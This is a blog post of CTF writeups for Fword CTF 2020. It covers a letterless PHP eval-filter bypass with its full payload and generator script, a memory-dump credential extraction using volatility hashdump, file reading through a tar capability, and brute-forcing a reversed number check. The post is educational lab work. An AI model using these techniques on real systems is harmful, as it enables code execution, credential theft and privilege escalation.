---
layout: "post"
title: "Fword CTF Writeup"
date: "2020-08-31 03:42:31"
date_gmt: "2020-08-31 03:42:31"
modified: "2020-08-31 03:42:31"
modified_gmt: "2020-08-31 03:42:31"
slug: "fword-ctf-writeup"
author: "brandonshi123"
status: "publish"
type: "post"
original_url: "https://y4y.space/2020/08/31/fword-ctf-writeup/"
guid: "http://y4y.space/?p=149"
wordpress_id: 149
parent_id: 0
categories: ["CTF"]
---

{% raw %}
A pretty good CTF event. I only did the easiest problems in web, reverse, bash, and forensic category.

# Writeups

## Jailoo Warmup (Web)

### Challenge Description

Get the flag in FLAG.PHP .

[link](http://jailoowarmup.fword.wtf/)

Author: HERA

### Solution

Source code is given, included in the appendix section.

Before navigating to the website, I took a look at the source code. Looks like it's filtering almost everything out except some special characters. The `preg_match_all` function takes a regular expression and a string as the first two parameters, if the string does not satisfy the regular expression, it returns false. And in this case, the regular expression is finding `$_()[];+="` characters in the `$cmd` string, which will be one of the HTTP parameter as well.

Then the code calls `eval`, which evaluates the string as PHP code. So if no letters or numbers are allowed, what else can I do? I tried XOR characters and realized there is no `^` in the regular expression string. After some playing around, I found `[].''` will evaluate to the result of `'Array'`.

![](https://y4y.space/wp-content/uploads/2020/08/screenshot-from-2020-08-29-22-46-17.png?w=976)

That's cool, but there are only 3 letters, which still does not help much. I then realized boolean variables can be represented as number 1 and 0. But still, does not help.

Finally from this bypass WAF [article](https://securityonline.info/bypass-waf-php-webshell-without-numbers-letters/), it tells me the solution. In PHP, the functions are case-insensitive, which means if I want to call function `system`, all of `SYSTEM`, `SysTeM`, `system`, `sysTEm`, etc will work. Next is, when I declare a PHP variable `$_ = 'A';`, and I increment it, it will go up by the ASCII value. So for example, `$_='A';$_++;` then the value of `$_` will be 'B'. With this I can generate any character as I want.

Since the challenge hinted the flag is in FLAG.PHP, so the final payload should look like `file_get_contents('FLAG.PHP');` or `readfile('FLAG.PHP')`. I choose the second expression since it's shorter. Now I need to construct my payload. The final payload should be `READFILE('FLAG.PHP');`. The filter will allow `();."`, so those are not problems, the issue is those letters.

My plan is to split my payload into three parts, the first part is `READFILE`, the second part is `FLAG`, and the third part is `PHP`. So I need to make three variables, and for each variable I need to start from letter 'A' and increment until I hit the letter I desired. Then I will concatenate the new letter with the variable I created.

The general idea should be like this:

```
$_=([]."")[("="=="_")]; // which evaluates as 'Array'[0] --> 'A'

$___=""; // declare an empty string

$_++;$_++;...... // until it reaches the desired character, let's say, 'R'

$___=$___.$_; // $___ = $___ + 'R'; --> $___ = '' + 'R';

$_=([]."")[("="=="_")]; // get a new 'A', because the last one is now 'R'.

// and repeat until I get the entire word.
```

I wrote a script to help me construct the final payload. Included in appendix as `ans.py`.

The final payload after I ran my script:

```
$_=[]."";$___="";$__=$_[("+"=="_")];$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$__=$_[("+"=="_")];$__++;$__++;$__++;$__++;$___.=$__;$__=$_[("+"=="_")];$___.=$__;$__=$_[("+"=="_")];$__++;$__++;$__++;$___.=$__;$__=$_[("+"=="_")];$__++;$__++;$__++;$__++;$__++;$___.=$__;$__=$_[("+"=="_")];$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$__=$_[("+"=="_")];$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$__=$_[("+"=="_")];$__++;$__++;$__++;$__++;$___.=$__;$____="";$__=$_[("+"=="_")];$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_[("+"=="_")];$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_[("+"=="_")];$____.=$__;$__=$_[("+"=="_")];$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$_____="";$__=$_[("+"=="_")];$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$_____.=$__;$__=$_[("+"=="_")];$__++;$__++;$__++;$__++;$__++;$__++;$__++;$_____.=$__;$__=$_[("+"=="_")];$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$_____.=$__;$___("".$____.".".$_____."");
```

![](https://y4y.space/wp-content/uploads/2020/08/screenshot-from-2020-08-29-23-02-17.png?w=1024)

Before deploying, always try on my local environment.

![](https://y4y.space/wp-content/uploads/2020/08/screenshot-from-2020-08-29-23-03-35.png?w=1024)

Good enough! Now paste my payload into broswer. Didn't see anything, but let me check HTML source code.

![](https://y4y.space/wp-content/uploads/2020/08/screenshot-from-2020-08-29-23-04-19.png?w=935)

That was a fun one.

### Flag

FwordCTF{Fr0m_3very_m0unta1ns1d3_l3t_fr33d0m_r1ng_MLK}

### Appendix

#### jailoo.php

```
<?php
    if(sizeof($_REQUEST)===2&& sizeof($_POST)===2){
    $cmd=$_POST['cmd'];
    $submit=$_POST['submit'];
    if(isset($cmd)&& isset($submit)){
        if(preg_match_all('/^(\$|\(|\)|\_|\[|\]|\=|\;|\+|\"|\.)*$/', $cmd, $matches)){
            echo "<div class=\"success\">Command executed !</div>";
            eval($cmd);
        }else{
            die("<div class=\"error\">NOT ALLOWED !</div>");
        }
    }else{
        die("<div class=\"error\">NOT ALLOWED !</div>");
    }
    }else if ($_SERVER['REQUEST_METHOD']!="GET"){
        die("<div class=\"error\">NOT ALLOWED !</div>");
    }
     ?>
```

#### ans.py

```
payload = ''
arr_str = '$_=[]."";' # Array
A_char = '$_[("+"=="_")];' # 'Array'[0]
r_char = '$_[("="=="=")];' # 'Array'[1]

# goal: readfile('FLAG.PHP');

def findChar(ch):
    cur = '$__=' + A_char
    cur_ord = ord('A')
    ch_ord = ord(ch.upper())
    while (cur_ord<ch_ord):
        cur += '$__++;'
        cur_ord += 1
    return cur

payload += arr_str
payload_p1 = '$___'
payload += payload_p1 + '="";'

for i in 'readfile':
    payload += findChar(i)
    payload += payload_p1 + '.=$__;'

payload_p2 = '$____'
payload += payload_p2 + '="";'

for i in 'FLAG':
    payload += findChar(i)
    payload += payload_p2 + '.=$__;'

payload_p3 = '$_____'
payload += payload_p3 + '="";'

for i in 'PHP':
    payload += findChar(i)
    payload += payload_p3 + '.=$__;'

payload += '$___("".' + '$____' + '.".".' + '$_____' + '."");'
print(payload)
```

## Memory (Forensics)

### Challenge Description

Flag is : FwordCTF{computername_user_password}

Author: SemahBA & KOOLI

### Solution

Memdump.

After downloading the attachment, unzip and get an image file.

Next run `volatility` against it and find out its system profile.

`volatility -f foren.raw imageinfo`

![](https://y4y.space/wp-content/uploads/2020/08/screenshot-from-2020-08-29-22-08-58.png?w=1024)

After knowing the profile, check for password since the challenge says password is part of flag.

`volatility -f foren.raw --profile=Win7SP1x64 hashdump`

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
fwordCTF:1000:aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da:::
HomeGroupUser$:1002:aad3b435b51404eeaad3b435b51404ee:514fab8ac8174851bfc79d9a205a939f:::
SBA_AK:1004:aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da:::
```

![](https://y4y.space/wp-content/uploads/2020/08/screenshot-from-2020-08-29-22-11-13.png?w=1024)

Then get the LM hashes, and crack them online. And find out user `fwordctf` and `SBA_AK` has the password of 'password123'.
Now the only thing left is the computer name.

`volatility -f foren.raw --profile=Win7SP1x64 envars | grep COMPUTERNAME`

![](https://y4y.space/wp-content/uploads/2020/08/screenshot-from-2020-08-29-22-20-19.png?w=1024)

All the pieces are here. Computer name is 'FORENWARMUP', username is 'SBA_AK', and password is 'password123'

### Flag

FwordCTF{FORENWARMUP_SBA_AK_password123}

## CapiCapi (Bash)

### Challenge Description

You have to do some privilege escalation in order to read the flag! Use the following SSH credentials to connect to the server, each participant will have an isolated environment so you only have to pwn me!
SSH Credentials
ssh -p 2222 ctf@capicapi.fword.wtf
Password: FwordxKahla
Author: KAHLA

### Solution

First SSH in with the credential challenge gave me. And the flag is just in user's home directory. However, only root users and users in the root group can read it. The user I have does not have such privilege. As the prompt mentioned, there should be some type of privilege escalation.

![](https://y4y.space/wp-content/uploads/2020/08/screenshot-from-2020-08-30-18-02-00.png?w=1024)

Since the name of challenge is CapiCapi, I assume it has something to do with [capabilities](https://man7.org/linux/man-pages/man7/capabilities.7.html).

To find binaries with capabilities, run `getcap`.

`getcap -r / 2>/dev/null`.

The command above is to search the root directory recursively, and redirect all the error message to `/dev/null`.

![](https://y4y.space/wp-content/uploads/2020/08/screenshot-from-2020-08-30-18-09-08.png?w=817)

Now the binary `tar` has a weird capability set, after some research, this capability allows binaries to read file without caring about permissions. That's just super.

Next is to figure out how I can read file with `tar`. Luckily I can find it on [gtfobin](https://gtfobins.github.io/).

In there, the way to read file with tar is included.

![](https://y4y.space/wp-content/uploads/2020/08/screenshot-from-2020-08-30-18-13-41.png?w=836)

Just replace the `"$LFILE"` with `flag.txt`, and get the flag.

![](https://y4y.space/wp-content/uploads/2020/08/screenshot-from-2020-08-30-18-15-09.png?w=1024)

### Flag

FwordCTF{C4pAbiLities_4r3_t00_S3Cur3_NaruT0_0nc3_S4id}

## Welcome Reverser (Reverse)

### Challenge Description

Hello and welcome to FwordCTF2k20 Let's start with something to warmup GOOD LUCK and have fun

nc welcome.fword.wtf 5000

Author: H4MA

### Solution

I don't think I 'solved' the problem, it was more like I 'guessed' it. But anyway, what do I care.

I tried ghidra and IDA for the challenge, and it turns out ghidra works better than IDA.

So after downloading the attachment and extract the binary from archive, first I tried is to put it into a decompiler.

![](https://y4y.space/wp-content/uploads/2020/08/screenshot-from-2020-08-30-18-31-52.png?w=503)

Normally I can see main among those functions, but this time I did not. Then I clicked those function with random names and see if I can find the main function.

Now here it is! First thing I did was to change the function name to main by clicking on the function name and select `rename function`.

![](https://y4y.space/wp-content/uploads/2020/08/screenshot-from-2020-08-30-18-33-46.png?w=626)

The program logic is rather clear, it takes input, does some checks, if it passes all checks then I will get the flag. And from the `_s=(char *)malloc(0x10);`, I can tell the input should be a string with length 16, or in this case is a number with length 16. Next few lines it prints out the welcome message and scan for user input.

Then it takes the input and put it into a function. I did some variables renaming so it's better to understand.

![](https://y4y.space/wp-content/uploads/2020/08/screenshot-from-2020-08-30-18-38-40.png?w=395)

This function is doing a while loop to iterate through the input string, checks if any characters is equal to '0', if not return 1, else return 0.

Then combining with the first if statement in main function:

`if(((int)uVar1!=0)&&(sVar2=strlen(input),sVar2 ==0x10)) {`

It will checks if the input has length of 16 and there is any '0's in the input. Now I know I cannot have any 0 in my number.

Onward to next step. It calls two functions, both two function take input as parameter. And let's look at those functions.

![](https://y4y.space/wp-content/uploads/2020/08/screenshot-from-2020-08-30-18-46-13.png?w=607)

This next function is crazier, it does more awful computations and finally returns the result.

The two functions above are not complicated, and it's easy to replicate.

The last check is the sum of results which are returned by those two function should be divisible by 10.

I initially thought I was going to use z3 to solve it, but I then changed my idea and just decided to brute force it.

I replicated the last two checks function in python and generated a number with length of 16. If the sum of values returned by those two functions are divisible, then I get a hit. Unfortuantely, it does not work quite as I expected, so I had to do another layer of check by implementing pwntools.

I could just connect to the remote server and bruteforce it, but I felt it can very well hammer the server, so I decided to test it on my local machine.

![](https://y4y.space/wp-content/uploads/2020/08/screenshot-from-2020-08-30-18-55-08.png?w=1024)

Now connect to remote server and get the flag with the right number.

![](https://y4y.space/wp-content/uploads/2020/08/screenshot-from-2020-08-30-18-56-19.png?w=1024)

I can probably connect to server using pwntools in my script, but meh.

### Flag

FwordCTF{luhn!_wh4t_a_w31rd_n4m3}

### Appendix

#### rev.py

```
from random import randint
from pwn import *

def gen(n):
    range_start = 10**(n-1)
    range_end = (10**n)-1
    return str(randint(range_start, range_end))

def op3(string):
    v2 = 0
    i = 0
    while (i < len(string)):
        v3 = 2 * (int(string[i]) - 48)
        if (3 * (~v3 & 0xfffffff7) + 2 * ~(v3 ^ 0xfffffff7) + 3 * (v3 & 8) - 2 * ~(v3 & 0xfffffff7)) > 0:
            v3 = ((v3 % 10) ^ (v3 / 10)) + 2 * ((v3 % 10) & (v3 / 10));
        v2 += v3
        i = 4 - (i ^ 2) + 2 * (i & 0xFFFFFFFD)
    return v2

def op2(string):
    v2 = 0
    i = 1
    while (i < len(string)):
        v2 = ((int(string[i]) - 48 | ~v2)) * 2 + (int(string[i]) - 48 ^ v2)
        i += 2
    return v2

num = gen(16)
while 1:
    p = process('./welcome')
    while 1:
        num = gen(16)
        while '0' in num:
            num = gen(16)
        if (op3(num) + op2(num))%10==0:
            break
    p.recvline()
    p.sendline(num)
    print('trying ' + num)
    result = p.recvall()
    if 'no' not in result:
        print(result)
        print('find it!')
        print(num)
        break
```

# Conclusion

Finally some PHP in web category! I was overwhelmed with all those XSS in recent CTFs, probably because I suck at JavsScript. I am also learning reverse recently, I don't think the knowledge I learned helped much this event, but I am sure it will pay off.
{% endraw %}
